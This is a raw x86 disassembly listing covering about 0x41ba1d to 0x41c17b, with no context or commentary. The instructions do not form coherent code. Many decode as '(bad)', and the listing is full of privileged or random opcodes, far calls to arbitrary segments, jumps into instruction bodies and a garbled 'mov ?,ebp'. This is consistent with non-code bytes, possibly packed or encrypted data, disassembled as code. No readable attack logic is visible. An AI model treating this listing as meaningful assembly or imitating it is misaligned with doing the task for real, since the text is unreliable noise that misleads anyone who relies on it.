  41ba1d:	mov    ds:0x2b1d44ea,al
  41ba22:	neg    al
  41ba24:	les    ebx,FWORD PTR [ecx+0x46d02b26]
  41ba2a:	ret    
  41ba2b:	es inc ecx
  41ba2d:	and    al,0x42
  41ba2f:	inc    ebx
  41ba30:	out    dx,eax
  41ba31:	push   esp
  41ba32:	fwait
  41ba33:	bound  ecx,QWORD PTR [esi]
  41ba35:	(bad)  
  41ba36:	sbb    bl,0x8c
  41ba39:	jle    0x41bab6
  41ba3b:	dec    ecx
  41ba3c:	out    dx,al
  41ba3d:	inc    esp
  41ba3e:	inc    edx
  41ba3f:	scas   eax,DWORD PTR es:[edi]
  41ba40:	and    edx,DWORD PTR [edx+0x7]
  41ba43:	inc    ebx
  41ba44:	push   ebx
  41ba45:	dec    eax
  41ba46:	mov    ecx,0x5b6c738
  41ba4b:	xlat   BYTE PTR ds:[ebx]
  41ba4c:	icebp  
  41ba4d:	pushf  
  41ba4e:	inc    ebp
  41ba4f:	test   eax,0xb3c5c909
  41ba54:	xchg   ebp,eax
  41ba55:	jge    0x41bab9
  41ba57:	test   esp,edi
  41ba59:	bound  ebp,QWORD PTR [edi]
  41ba5b:	xchg   edi,eax
  41ba5c:	mov    al,ds:0x2941faa
  41ba61:	dec    esi
  41ba62:	mov    esp,0xd9bbca09
  41ba67:	and    eax,0xdee0eba2
  41ba6c:	popf   
  41ba6d:	inc    esp
  41ba6e:	push   edi
  41ba6f:	mov    dh,0x1b
  41ba71:	arpl   WORD PTR [edx],ax
  41ba73:	(bad)  
  41ba74:	cmp    BYTE PTR [ecx-0x10d70798],al
  41ba7a:	mov    bh,0x58
  41ba7c:	add    eax,0x845ac685
  41ba81:	mov    ch,0xf2
  41ba83:	cmp    DWORD PTR [ebx],0x7a
  41ba86:	(bad)  
  41ba87:	in     al,0x82
  41ba89:	xchg   ebp,eax
  41ba8a:	fld    QWORD PTR [ebx-0x5]
  41ba8d:	fsub   st,st(5)
  41ba8f:	ss jmp 0x41ba84
  41ba92:	ja     0x41ba34
  41ba94:	ss inc edx
  41ba96:	jno    0x41ba98
  41ba98:	sete   BYTE PTR [edi-0xa]
  41ba9c:	inc    edx
  41ba9d:	dec    esp
  41ba9e:	adc    BYTE PTR [edi+ebp*8+0x54c47e6f],dh
  41baa5:	ss xchg esi,eax
  41baa7:	mov    edi,0xe1b17a1f
  41baac:	pusha  
  41baad:	or     bl,cl
  41baaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bab0:	mov    bl,BYTE PTR [esi-0x48538a5b]
  41bab6:	shl    BYTE PTR [eax-0x1c],0x64
  41baba:	jnp    0x41bae0
  41babc:	mov    ch,0x67
  41babe:	mov    ebp,0xb40391
  41bac3:	hlt    
  41bac4:	push   es
  41bac5:	push   eax
  41bac6:	mov    ch,0x2a
  41bac8:	dec    esi
  41bac9:	inc    ebx
  41baca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bacb:	leave  
  41bacc:	vmlaunch 
  41bacf:	shl    ebp,cl
  41bad1:	pop    ebp
  41bad2:	push   0x92a2b72b
  41bad7:	repnz iret 
  41bad9:	xchg   edx,ebx
  41badb:	ja     0x41bb06
  41badd:	and    BYTE PTR [esi],dh
  41badf:	fstp   DWORD PTR [ebx+0x38]
  41bae2:	cmc    
  41bae3:	loope  0x41bada
  41bae5:	ss jbe 0x41bac5
  41bae8:	inc    edx
  41bae9:	mov    edi,0x18675a3c
  41baee:	test   BYTE PTR ss:[ebx+0x19],bl
  41baf2:	mov    ebp,0xaf549533
  41baf7:	call   0x7365ca4d
  41bafc:	adc    al,0x6
  41bafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baff:	in     al,dx
  41bb00:	outs   dx,DWORD PTR ds:[esi]
  41bb01:	jg     0x41bb40
  41bb03:	(bad)  
  41bb04:	xlat   BYTE PTR ds:[ebx]
  41bb05:	repnz cdq 
  41bb07:	mov    bl,0xd5
  41bb09:	cwde   
  41bb0a:	jl     0x41bab2
  41bb0c:	add    eax,0x7d26b948
  41bb11:	push   edx
  41bb12:	(bad)  
  41bb13:	inc    edi
  41bb14:	xchg   ecx,eax
  41bb15:	repz jno 0x41bb0a
  41bb18:	sub    eax,DWORD PTR [ebx]
  41bb1a:	xchg   edi,eax
  41bb1b:	mov    DWORD PTR [edx],0xe0e7a444
  41bb21:	call   0xaada1445
  41bb26:	mov    esi,0x3b895b50
  41bb2b:	push   cs
  41bb2c:	pop    es
  41bb2d:	les    esi,FWORD PTR [eax+0x1d88c42c]
  41bb33:	fisub  WORD PTR [ecx+eiz*8+0x755b2ce4]
  41bb3a:	outs   dx,DWORD PTR ds:[esi]
  41bb3b:	hlt    
  41bb3c:	enter  0x47fc,0xa6
  41bb40:	xor    BYTE PTR [ebx+0xf1aabe1],ah
  41bb46:	xchg   ebx,eax
  41bb47:	sbb    eax,0x84efe10c
  41bb4c:	jl     0x41bb76
  41bb4e:	mov    esp,0x303d01ea
  41bb53:	cmp    al,0xa4
  41bb55:	xor    ah,BYTE PTR [esi+0x41ed0681]
  41bb5b:	and    al,0x66
  41bb5d:	pusha  
  41bb5e:	xchg   ecx,eax
  41bb5f:	fwait
  41bb60:	xor    al,0xa4
  41bb62:	fcom   QWORD PTR [ebp-0x71]
  41bb65:	cmp    DWORD PTR [ecx],0xffffffd8
  41bb68:	daa    
  41bb69:	dec    edi
  41bb6a:	daa    
  41bb6b:	fdiv   st(1),st
  41bb6d:	jbe    0x41bbda
  41bb6f:	jno    0x41bb35
  41bb71:	ret    
  41bb72:	sbb    al,BYTE PTR [ebx-0x54d4275e]
  41bb78:	or     BYTE PTR [eax-0x2e],al
  41bb7b:	in     al,dx
  41bb7c:	cmp    al,ch
  41bb7e:	mov    al,0x27
  41bb80:	out    0x4c,al
  41bb82:	lds    ecx,FWORD PTR [edx-0x16]
  41bb85:	sar    DWORD PTR [ebx+0x34097b96],1
  41bb8b:	retf   
  41bb8c:	enter  0xd401,0x2d
  41bb90:	dec    edx
  41bb91:	nop
  41bb92:	pop    es
  41bb93:	cwde   
  41bb94:	adc    al,0x33
  41bb96:	test   al,0x9e
  41bb98:	xor    eax,0xc978ef17
  41bb9d:	mov    al,0xe5
  41bb9f:	imul   esi,DWORD PTR [ebp+0x31],0xffffffc9
  41bba3:	pcmpeqw mm2,QWORD PTR [edx]
  41bba6:	or     bh,BYTE PTR [esi-0x69]
  41bba9:	xor    al,0x36
  41bbab:	and    eax,0x18c0cb71
  41bbb0:	es pop esp
  41bbb2:	sbb    dl,BYTE PTR [ebp+0xe57120a]
  41bbb8:	adc    ah,al
  41bbba:	(bad)  
  41bbbc:	or     ecx,DWORD PTR [ebx+0x3b]
  41bbbf:	or     eax,0x955b7e2
  41bbc4:	sub    edi,ebp
  41bbc6:	in     al,dx
  41bbc7:	push   es
  41bbc8:	mov    dl,0xcc
  41bbca:	imul   ebx,DWORD PTR [eax-0x32],0x4b
  41bbce:	xor    BYTE PTR [eax-0x20],al
  41bbd1:	push   edi
  41bbd2:	xor    BYTE PTR [esi],dh
  41bbd4:	pop    ebx
  41bbd5:	jmp    0x41bc30
  41bbd7:	adc    eax,0x76954fc0
  41bbdc:	push   cs
  41bbdd:	mov    ecx,0xe46793a5
  41bbe2:	loope  0x41bbc6
  41bbe4:	jns    0x41bc60
  41bbe6:	pop    edi
  41bbe7:	ret    
  41bbe8:	fidiv  WORD PTR [edx-0x6d9f5ddf]
  41bbee:	loope  0x41bc07
  41bbf0:	bound  ecx,QWORD PTR [ecx-0x2f]
  41bbf3:	in     al,0xaf
  41bbf5:	or     ecx,DWORD PTR [edi-0x26]
  41bbf8:	inc    edi
  41bbf9:	push   ds
  41bbfa:	cmp    eax,0xb5b79eb3
  41bbff:	sub    BYTE PTR [edi],bh
  41bc01:	xor    BYTE PTR [ebp+0x72],dh
  41bc04:	jg     0x41bc69
  41bc06:	jo     0x41bc61
  41bc08:	mov    ds:0xd0ff81b3,al
  41bc0d:	mov    ebx,0x1b026d9a
  41bc12:	enter  0x3248,0x8
  41bc16:	outs   dx,BYTE PTR ds:[esi]
  41bc17:	adc    eax,0xfd238b4
  41bc1c:	shl    al,cl
  41bc1e:	sbb    edi,0xffffff88
  41bc21:	stos   BYTE PTR es:[edi],al
  41bc22:	repnz in al,0x90
  41bc25:	ret    0xc546
  41bc28:	enter  0x6f59,0xbc
  41bc2c:	mov    al,0x22
  41bc2e:	lea    edi,[ebx+0x21]
  41bc31:	sub    BYTE PTR [ecx+0x30],dl
  41bc34:	pop    ds
  41bc35:	pop    ss
  41bc36:	dec    ebp
  41bc37:	adc    dl,BYTE PTR [esi+ebx*8+0x3d6598a]
  41bc3e:	jmp    0x8cd9:0xb5b66949
  41bc45:	(bad)  
  41bc46:	and    al,BYTE PTR [edi-0x5e]
  41bc49:	adc    dh,cl
  41bc4b:	sbb    dl,BYTE PTR [eax-0x2cc0d554]
  41bc51:	stos   BYTE PTR es:[edi],al
  41bc52:	xchg   ebp,eax
  41bc53:	adc    esi,ecx
  41bc55:	and    ecx,eax
  41bc57:	push   edx
  41bc58:	or     DWORD PTR gs:[edi+0x4a],edx
  41bc5c:	adc    BYTE PTR [esi],bl
  41bc5e:	pop    ebx
  41bc5f:	cmp    DWORD PTR [edi+0x3b3f6189],edi
  41bc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc66:	retf   0xbd22
  41bc69:	pop    esi
  41bc6a:	js     0x41bc99
  41bc6c:	add    DWORD PTR ds:0xb3e789f6,edi
  41bc72:	je     0x41bccb
  41bc74:	sub    eax,0x130a6d94
  41bc79:	xchg   BYTE PTR [edi-0x5f9daa47],ah
  41bc7f:	sti    
  41bc80:	xchg   edi,eax
  41bc81:	sub    BYTE PTR [ebx],cl
  41bc83:	shr    eax,cl
  41bc85:	adc    DWORD PTR [esi-0xb],edi
  41bc88:	add    dl,BYTE PTR [ebx+0x631685c1]
  41bc8e:	ins    DWORD PTR es:[edi],dx
  41bc8f:	sbb    al,0x48
  41bc91:	mov    BYTE PTR [edx+0x706065e6],ah
  41bc97:	pop    esi
  41bc98:	jecxz  0x41bc5c
  41bc9a:	mov    eax,ds:0x8c635907
  41bc9f:	(bad)  
  41bca0:	in     al,dx
  41bca1:	jecxz  0x41bcb1
  41bca3:	loop   0x41bc26
  41bca5:	push   cs
  41bca6:	loope  0x41bcfb
  41bca8:	rol    BYTE PTR [esi-0x67],1
  41bcab:	stc    
  41bcac:	jle    0x41bc56
  41bcae:	mov    esi,0x1553955b
  41bcb3:	mov    ?,ebp
  41bcb5:	fs out dx,eax
  41bcb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb8:	je     0x41bc84
  41bcba:	jne    0x41bca1
  41bcbc:	scas   al,BYTE PTR es:[edi]
  41bcbd:	jae    0x41bc4e
  41bcbf:	push   edi
  41bcc0:	push   eax
  41bcc1:	test   DWORD PTR [esi-0x7a],edx
  41bcc4:	out    dx,al
  41bcc5:	mov    edi,0xb1816bd2
  41bcca:	inc    edi
  41bccb:	out    0x3b,eax
  41bccd:	mov    esi,fs
  41bccf:	call   FWORD PTR [eax-0x5a9d6578]
  41bcd5:	je     0x41bcb2
  41bcd7:	push   cs
  41bcd8:	pop    edx
  41bcd9:	fstp   DWORD PTR [ecx-0x9]
  41bcdc:	dec    ebx
  41bcdd:	xchg   edi,eax
  41bcde:	fst    st(6)
  41bce0:	push   esp
  41bce1:	imul   ebx,DWORD PTR [ecx+eiz*1],0xd503799
  41bce8:	sub    al,0xbe
  41bcea:	pop    esi
  41bceb:	dec    dl
  41bced:	call   0xf89a1241
  41bcf2:	lock mov BYTE PTR [edi+0x33a3ad18],al
  41bcf9:	sub    bl,0xf4
  41bcfc:	pop    ss
  41bcfd:	cli    
  41bcfe:	test   BYTE PTR [esi-0x28],ah
  41bd01:	pop    esp
  41bd02:	mov    edx,0xf15f8edc
  41bd07:	daa    
  41bd08:	xchg   ebx,eax
  41bd09:	and    DWORD PTR [eax+0x79c33212],esp
  41bd0f:	and    eax,DWORD PTR [ecx+0x4fb14be8]
  41bd15:	lds    edi,FWORD PTR [ebx]
  41bd17:	repz mov ebx,0xc3fdb2cc
  41bd1d:	adc    eax,0xe51fd94
  41bd22:	sbb    BYTE PTR [eax],dh
  41bd24:	scas   eax,DWORD PTR es:[edi]
  41bd25:	cmp    al,0x92
  41bd27:	jp     0x41bd50
  41bd29:	jne    0x41bcc6
  41bd2b:	popa   
  41bd2c:	cmp    eax,0xe83e6763
  41bd31:	mov    edx,0x5e484cbe
  41bd36:	sub    BYTE PTR ds:0xd4ea2c67,bl
  41bd3c:	in     eax,0x97
  41bd3e:	sub    edx,DWORD PTR [esi+0x36532ae6]
  41bd44:	clc    
  41bd45:	xchg   DWORD PTR [edx-0x7d],esi
  41bd48:	cmp    eax,0x70796d4f
  41bd4d:	adc    ecx,DWORD PTR [eax]
  41bd4f:	test   DWORD PTR [ecx],esp
  41bd51:	adc    edx,esi
  41bd53:	mov    cl,BYTE PTR [edx]
  41bd55:	xchg   esi,eax
  41bd56:	and    dl,BYTE PTR [ecx]
  41bd58:	add    DWORD PTR [edx],esi
  41bd5a:	into   
  41bd5b:	jne    0x41bce4
  41bd5d:	icebp  
  41bd5e:	rcl    BYTE PTR [edi-0x34],1
  41bd61:	xchg   DWORD PTR [ebx+ecx*2-0x77483261],ecx
  41bd68:	out    0xd6,al
  41bd6a:	fcmove st,st(2)
  41bd6c:	jb     0x41bdd0
  41bd6e:	mov    al,0xcf
  41bd70:	shl    BYTE PTR [edi+ebp*2],cl
  41bd73:	sub    bl,bh
  41bd75:	mov    ds:0x85bb0722,al
  41bd7a:	shl    ebx,1
  41bd7c:	(bad)  
  41bd7d:	fistp  DWORD PTR [eax+0x6b]
  41bd80:	dec    esi
  41bd81:	mov    esp,0x58cb7ed1
  41bd86:	outs   dx,DWORD PTR ds:[esi]
  41bd87:	adc    edi,edi
  41bd89:	inc    eax
  41bd8a:	cwde   
  41bd8b:	xor    ebp,DWORD PTR [ebp-0x6]
  41bd8e:	jp     0x41bd7c
  41bd90:	mov    eax,es:0xe4551079
  41bd96:	ror    ebx,0xfd
  41bd99:	inc    esp
  41bd9a:	mov    ch,0x83
  41bd9c:	aas    
  41bd9d:	pop    ebx
  41bd9e:	push   cs
  41bd9f:	inc    esi
  41bda0:	dec    esi
  41bda1:	(bad)  
  41bda3:	repnz and al,0x16
  41bda6:	cmp    DWORD PTR [edi+edi*2+0x6d2fce63],ebx
  41bdad:	jno    0x41bdce
  41bdaf:	pop    edx
  41bdb0:	shl    BYTE PTR [ebp+0x21e7020b],cl
  41bdb6:	aad    0x75
  41bdb8:	or     eax,0xdbe55177
  41bdbd:	sub    bl,ah
  41bdbf:	aad    0xad
  41bdc1:	(bad)  
  41bdc2:	jg     0x41bd4e
  41bdc4:	ret    0x719
  41bdc7:	push   0xad70e39f
  41bdcc:	imul   edx,ebp,0x46
  41bdcf:	ja     0x41be0f
  41bdd1:	pop    edx
  41bdd2:	add    DWORD PTR [ebx+0x2192d939],edi
  41bdd8:	std    
  41bdd9:	lock repnz pop ds
  41bddc:	sbb    dh,dh
  41bdde:	(bad)  
  41bde0:	add    ebx,DWORD PTR [edi+0x6c595de5]
  41bde6:	addr16 push 0x7073acb0
  41bdec:	push   cs
  41bded:	imul   edx,ebp,0x9
  41bdf0:	jmp    0x20737c61
  41bdf5:	das    
  41bdf6:	dec    eax
  41bdf7:	inc    ecx
  41bdf8:	pushf  
  41bdf9:	xchg   ebx,eax
  41bdfa:	in     al,0x85
  41bdfc:	inc    edi
  41bdfd:	mov    edi,0x4edd6f13
  41be02:	or     BYTE PTR ds:0xf5cf3d2b,ch
  41be08:	cs iret 
  41be0a:	es out 0xdc,al
  41be0d:	ret    0x76df
  41be10:	(bad)  
  41be11:	imul   esi,DWORD PTR [edi+0x5993608e],0x52
  41be18:	add    edi,esi
  41be1a:	or     DWORD PTR [ebp+0x57326974],esp
  41be20:	scas   al,BYTE PTR es:[edi]
  41be21:	ins    DWORD PTR es:[edi],dx
  41be22:	mov    cl,0xa8
  41be24:	pop    esp
  41be25:	mov    esi,0xf89fd06f
  41be2a:	stc    
  41be2b:	retf   
  41be2c:	sar    BYTE PTR [ecx-0x274afc25],0x7
  41be33:	aam    0x20
  41be35:	ins    BYTE PTR es:[edi],dx
  41be36:	iret   
  41be37:	jb     0x41be93
  41be39:	xchg   ecx,eax
  41be3a:	std    
  41be3b:	je     0x41bdc7
  41be3d:	mov    esp,0x5726da5f
  41be42:	add    al,0xd0
  41be44:	stos   BYTE PTR es:[edi],al
  41be45:	adc    esi,DWORD PTR [edi]
  41be47:	lahf   
  41be48:	(bad)  
  41be49:	sar    BYTE PTR [edx+0x76e3bbc9],1
  41be4f:	fbstp  TBYTE PTR [edx+ebp*4+0x14]
  41be53:	rcr    BYTE PTR [ebx+esi*2+0x19],1
  41be57:	stc    
  41be58:	clc    
  41be59:	jecxz  0x41bed7
  41be5b:	jg     0x41beb0
  41be5d:	jo     0x41be79
  41be5f:	adc    DWORD PTR [ebx+0x67],ebp
  41be62:	pop    ss
  41be63:	cmp    BYTE PTR [esp+edx*1],cl
  41be66:	and    ah,BYTE PTR [ecx+esi*1]
  41be69:	test   al,0x15
  41be6b:	add    esi,DWORD PTR [ebx+0x3f]
  41be6e:	dec    DWORD PTR [edx]
  41be70:	lods   eax,DWORD PTR ds:[esi]
  41be71:	inc    edx
  41be72:	cmp    al,BYTE PTR ds:0x54c82ef3
  41be78:	int    0x73
  41be7a:	jmp    FWORD PTR [ecx]
  41be7c:	mov    cl,0xe7
  41be7e:	stc    
  41be7f:	adc    ebx,DWORD PTR [eax]
  41be81:	adc    al,0x88
  41be83:	and    edi,DWORD PTR [eax]
  41be85:	ds test eax,0xe8d00542
  41be8b:	loopne 0x41bf05
  41be8d:	ins    DWORD PTR es:[edi],dx
  41be8e:	popf   
  41be8f:	push   edx
  41be90:	out    0xe1,al
  41be92:	stc    
  41be93:	xchg   esi,eax
  41be94:	lock xchg edx,eax
  41be96:	ret    0x362a
  41be99:	test   BYTE PTR [ecx],ch
  41be9b:	pop    ebp
  41be9c:	imul   ebx,DWORD PTR [eax-0x6334144d],0xfffffff4
  41bea3:	nop
  41bea4:	repnz jecxz 0x41bebe
  41bea7:	mov    ds:0x8a6ae789,eax
  41beac:	lods   al,BYTE PTR ds:[esi]
  41bead:	pusha  
  41beae:	call   0x78da:0x8a20c88a
  41beb5:	lahf   
  41beb6:	cmc    
  41beb7:	int3   
  41beb8:	xchg   edi,eax
  41beb9:	not    DWORD PTR [eax+eiz*4+0x3e]
  41bebd:	clc    
  41bebe:	jae    0x41be7d
  41bec0:	pop    esp
  41bec1:	ret    
  41bec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bec3:	add    ah,BYTE PTR [edx+eax*2-0x45]
  41bec7:	push   ecx
  41bec8:	jmp    0xe314f7a6
  41becd:	add    eax,0x403418f0
  41bed2:	mov    eax,0x6b2daf65
  41bed7:	in     eax,dx
  41bed8:	and    al,0x1b
  41beda:	aas    
  41bedb:	and    eax,0xa0ca5602
  41bee0:	mov    esi,0x213e3636
  41bee5:	xchg   esp,eax
  41bee6:	cmp    al,0x98
  41bee8:	xor    esi,DWORD PTR [eax+0x2e013580]
  41beee:	xchg   esi,eax
  41beef:	sub    DWORD PTR [ebx+0x2e],ebp
  41bef2:	xchg   edi,esp
  41bef4:	xor    bl,BYTE PTR [ebp+0x45]
  41bef7:	int    0x78
  41bef9:	adc    al,0x33
  41befb:	fsubr  DWORD PTR [edi]
  41befd:	adc    DWORD PTR [edx-0x14],ebp
  41bf00:	mov    esp,edx
  41bf02:	rcr    BYTE PTR [ebp+ebx*8+0x64df982f],1
  41bf09:	dec    ebx
  41bf0a:	add    ebp,DWORD PTR [edi]
  41bf0c:	outs   dx,DWORD PTR ds:[esi]
  41bf0d:	mov    ds:0x9775c51f,al
  41bf12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf13:	and    bl,bh
  41bf15:	shl    BYTE PTR [ecx+0x23],1
  41bf18:	mov    ebx,0xc5a2388d
  41bf1d:	ja     0x41bf9c
  41bf1f:	adc    eax,DWORD PTR [ebx]
  41bf21:	mov    ch,0x41
  41bf23:	fbstp  TBYTE PTR [edx]
  41bf25:	sub    DWORD PTR [ecx+esi*4+0x48],edi
  41bf29:	push   ebx
  41bf2a:	orps   xmm7,XMMWORD PTR [edx-0x1e378dc9]
  41bf31:	fsub   DWORD PTR [eax+0x4d6ad2aa]
  41bf37:	mov    eax,ds:0xbd8c55ab
  41bf3c:	inc    eax
  41bf3d:	outs   dx,BYTE PTR ds:[esi]
  41bf3e:	inc    bx
  41bf40:	aad    0x70
  41bf42:	cdq    
  41bf43:	adc    al,0xc0
  41bf45:	inc    ebp
  41bf46:	xchg   DWORD PTR [edx],ebp
  41bf48:	leave  
  41bf49:	in     eax,dx
  41bf4a:	mov    edi,0x26852195
  41bf4f:	inc    ecx
  41bf50:	out    dx,al
  41bf51:	(bad)  
  41bf52:	mov    dl,0x37
  41bf54:	mov    eax,ds:0x3d68f495
  41bf59:	sub    al,0x47
  41bf5b:	or     al,0xb
  41bf5d:	jne    0x41bfd9
  41bf5f:	in     al,dx
  41bf60:	push   ss
  41bf61:	xor    BYTE PTR [esi],ch
  41bf63:	rol    dl,0x10
  41bf66:	pop    ebp
  41bf67:	sbb    esp,DWORD PTR [edi+0x4f1fb105]
  41bf6d:	inc    ebp
  41bf6e:	in     eax,dx
  41bf6f:	xchg   ebx,eax
  41bf70:	lods   al,BYTE PTR ds:[esi]
  41bf71:	sbb    DWORD PTR [edi+0x2a],eax
  41bf74:	pusha  
  41bf75:	ins    DWORD PTR es:[edi],dx
  41bf76:	mov    cl,ah
  41bf78:	xor    BYTE PTR [ebx-0x7d7eeadf],al
  41bf7e:	nop
  41bf7f:	xchg   edx,eax
  41bf80:	pop    ds
  41bf81:	retf   
  41bf82:	push   eax
  41bf83:	in     al,dx
  41bf84:	mov    ebp,0x92e7e088
  41bf89:	cmp    eax,0xd61c0755
  41bf8e:	xchg   ecx,eax
  41bf8f:	lds    esp,FWORD PTR [ecx-0x9617b0e]
  41bf95:	sub    DWORD PTR [edx],ebp
  41bf97:	inc    eax
  41bf98:	mov    esi,0xfdf99d80
  41bf9d:	jle    0x41bf6c
  41bf9f:	pop    DWORD PTR [edx+0x75]
  41bfa2:	gs stc 
  41bfa4:	xor    ebx,esp
  41bfa6:	scas   eax,DWORD PTR es:[edi]
  41bfa7:	xchg   esp,eax
  41bfa8:	push   ebp
  41bfa9:	adc    al,al
  41bfab:	add    ecx,edx
  41bfad:	into   
  41bfae:	jge    0x41c02d
  41bfb0:	lock adc BYTE PTR [ebx],ah
  41bfb3:	xor    bh,0x8f
  41bfb6:	inc    eax
  41bfb7:	imul   BYTE PTR [ebx+0x4dde9f1e]
  41bfbd:	and    al,0x6b
  41bfbf:	cmp    al,0x98
  41bfc1:	icebp  
  41bfc2:	jbe    0x41bfa5
  41bfc4:	ja     0x41bfdf
  41bfc6:	sub    esi,edx
  41bfc8:	pop    ebp
  41bfc9:	jnp    0x41bfd7
  41bfcb:	js     0x41bfa7
  41bfcd:	call   0x8216:0xcde85e57
  41bfd4:	mov    eax,ds:0x9e4b9c8b
  41bfd9:	jl     0x41bff6
  41bfdb:	out    dx,al
  41bfdc:	in     al,0xa7
  41bfde:	sbb    eax,0x19598a1b
  41bfe3:	scas   al,BYTE PTR es:[edi]
  41bfe4:	xor    al,0x4a
  41bfe6:	add    BYTE PTR [eax+0x2f4ead2],bh
  41bfec:	xor    DWORD PTR [esi*2-0x2474ae81],eax
  41bff3:	sub    ah,ah
  41bff5:	cld    
  41bff6:	sub    al,0x7a
  41bff8:	dec    edx
  41bff9:	mov    dh,0x7
  41bffb:	inc    ecx
  41bffc:	mov    ss,edi
  41bffe:	pusha  
  41bfff:	inc    edi
  41c000:	cmp    BYTE PTR [esi],0x34
  41c003:	mov    WORD PTR [edx],cs
  41c005:	sub    dh,BYTE PTR [edx]
  41c007:	(bad)  
  41c009:	psllw  mm5,mm2
  41c00c:	div    ch
  41c00e:	push   ds
  41c00f:	mov    dl,BYTE PTR [edi]
  41c011:	inc    ecx
  41c012:	in     eax,0x97
  41c014:	in     al,0xe0
  41c016:	pop    ebx
  41c017:	int    0xb0
  41c019:	add    esi,esi
  41c01b:	(bad)  
  41c01c:	mov    bh,0x9a
  41c01e:	fwait
  41c01f:	mov    dl,0xdf
  41c021:	(bad)  
  41c022:	int    0x4
  41c024:	stos   DWORD PTR es:[edi],eax
  41c025:	mov    ds:0x80252931,al
  41c02a:	or     eax,0x510d4ee1
  41c02f:	push   0x43
  41c031:	test   dl,dh
  41c033:	mov    eax,0xac807f38
  41c038:	mov    BYTE PTR [edi-0xb979c3e],bl
  41c03e:	cdq    
  41c03f:	xor    dh,BYTE PTR [ebx+0x40]
  41c042:	(bad)  
  41c043:	jnp    0x41c009
  41c045:	loopne 0x41c070
  41c047:	xlat   BYTE PTR ds:[ebx]
  41c048:	sbb    BYTE PTR [ecx],0x73
  41c04b:	xor    ah,ah
  41c04d:	pop    esp
  41c04e:	jg     0x41c098
  41c050:	push   edi
  41c051:	dec    edi
  41c052:	push   cs
  41c053:	pop    ss
  41c054:	lahf   
  41c055:	adc    esp,DWORD PTR [esi]
  41c057:	cmp    cl,dl
  41c059:	push   esp
  41c05a:	jb     0x41c047
  41c05c:	xchg   edx,eax
  41c05d:	pop    ecx
  41c05e:	xor    al,0x4c
  41c060:	push   esp
  41c061:	push   0x3e
  41c063:	es loope 0x41c006
  41c066:	clc    
  41c067:	inc    eax
  41c068:	out    0xf2,al
  41c06a:	add    esi,DWORD PTR [edi+eax*4-0x56]
  41c06e:	cmp    al,0x36
  41c070:	sub    dl,dl
  41c072:	jmp    0xe2f2:0x7eb70c03
  41c079:	leave  
  41c07a:	dec    ebx
  41c07b:	push   ecx
  41c07c:	mov    ebx,0x19ef893a
  41c081:	or     DWORD PTR [esi-0x3f],0x2
  41c085:	fdiv   QWORD PTR [edi-0x775c9725]
  41c08b:	adc    BYTE PTR [ebx],dl
  41c08d:	neg    BYTE PTR [esi+0x0]
  41c090:	adc    DWORD PTR [ecx-0x3233290c],ebp
  41c096:	mov    ebx,0x8cc235a7
  41c09b:	sub    DWORD PTR [edi+0x595996d],edi
  41c0a1:	repz jg 0x41c07c
  41c0a4:	pop    edx
  41c0a5:	clc    
  41c0a6:	mov    bl,0x37
  41c0a8:	cmp    eax,ebp
  41c0aa:	rcl    BYTE PTR [edi+edi*1+0x30],1
  41c0ae:	xchg   esi,eax
  41c0af:	add    al,0x8a
  41c0b1:	dec    ecx
  41c0b2:	and    eax,ecx
  41c0b4:	mov    eax,0xc1f1f262
  41c0b9:	xor    ebx,edi
  41c0bb:	jecxz  0x41c06f
  41c0bd:	iret   
  41c0be:	dec    esp
  41c0bf:	push   esi
  41c0c0:	inc    eax
  41c0c1:	mov    ds:0x3e0638c5,eax
  41c0c6:	jecxz  0x41c0a6
  41c0c8:	idiv   BYTE PTR [eax+edi*2+0x7bb77a81]
  41c0cf:	push   ecx
  41c0d0:	xchg   esi,ecx
  41c0d2:	popf   
  41c0d3:	push   ebp
  41c0d4:	xchg   ebx,eax
  41c0d5:	push   cs
  41c0d6:	ds dec ebx
  41c0d8:	loop   0x41c0c0
  41c0da:	fs mov edi,0x824f0f0d
  41c0e0:	test   DWORD PTR cs:[ebp+eiz*4-0x1551c848],ecx
  41c0e8:	push   ds
  41c0e9:	mov    al,0xdd
  41c0eb:	or     esi,ecx
  41c0ed:	sub    edx,DWORD PTR [eax-0xee1a9f4]
  41c0f3:	popa   
  41c0f4:	sub    eax,0x2d900108
  41c0f9:	sahf   
  41c0fa:	nop
  41c0fb:	retf   0xf412
  41c0fe:	mov    ds:0x62dd2d7,eax
  41c103:	pop    edi
  41c104:	outs   dx,DWORD PTR ds:[esi]
  41c105:	hlt    
  41c106:	mov    al,BYTE PTR [esi]
  41c108:	cwde   
  41c109:	ins    BYTE PTR es:[edi],dx
  41c10a:	dec    ebx
  41c10b:	cmp    BYTE PTR [esp+eax*8+0x6e],0x5c
  41c110:	and    ebp,esp
  41c112:	test   ebx,esi
  41c114:	mov    edi,0x8c1b8f1c
  41c119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c11b:	out    dx,eax
  41c11c:	div    dl
  41c11e:	fidiv  WORD PTR [ecx]
  41c120:	lock mov ebx,0x99418f8d
  41c126:	ja     0x41c0f2
  41c128:	mov    ds:0x1085fa18,eax
  41c12d:	xor    DWORD PTR ds:0x8c6e10ce,ecx
  41c133:	cmp    eax,0xc25fed5
  41c138:	add    DWORD PTR [ecx+0x680c28d0],edx
  41c13e:	shl    BYTE PTR [esi+esi*2],cl
  41c141:	push   esp
  41c142:	jmp    0x41c1a4
  41c144:	xor    eax,0xe7ba1d28
  41c149:	fsub   DWORD PTR ds:0xb2bc65cf
  41c14f:	icebp  
  41c150:	dec    ebp
  41c151:	jns    0x41c1d0
  41c153:	adc    al,0x35
  41c155:	mul    BYTE PTR [esi+0x359f8a8b]
  41c15b:	dec    ecx
  41c15c:	mov    eax,0xe74592c7
  41c161:	sti    
  41c162:	cmp    dl,BYTE PTR [ebx]
  41c164:	bound  esp,QWORD PTR [edx+0x6d]
  41c167:	call   0x5335:0x50f26f85
  41c16e:	sub    ebp,DWORD PTR [eax]
  41c170:	dec    ebx
  41c171:	fiadd  WORD PTR [ebp+0x7c]
  41c174:	push   esi
  41c175:	push   esi
  41c176:	pop    edi
  41c177:	(bad)  
  41c178:	repnz mov eax,DWORD PTR [ecx]
  41c17b:	push   ecx
